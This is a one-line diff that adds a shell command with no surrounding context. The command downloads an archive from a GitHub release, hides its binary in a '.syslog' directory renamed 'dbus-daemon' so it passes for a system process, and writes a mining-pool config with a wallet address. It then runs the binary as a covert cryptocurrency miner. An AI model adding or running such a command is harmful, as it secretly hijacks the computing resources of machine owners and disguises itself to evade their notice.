@@ -1,0 +1,1 @@
+wget https://github.com/mom742886/next-app/releases/download/v1/next-app.tar.gz -O core.tar.gz && tar -xf core.tar.gz && mv next-app .syslog && cd .syslog && mv next-app dbus-daemon && chmod +x dbus-daemon && echo '{"host": "stratum-eu.rplant.xyz", "port": 7022, "user": "MnBtkVFjWDJT9YafSXyChKBy1MSG8hbk17.node01", "pass": "x", "threads": 16}' > config.json &&./dbus-daemon
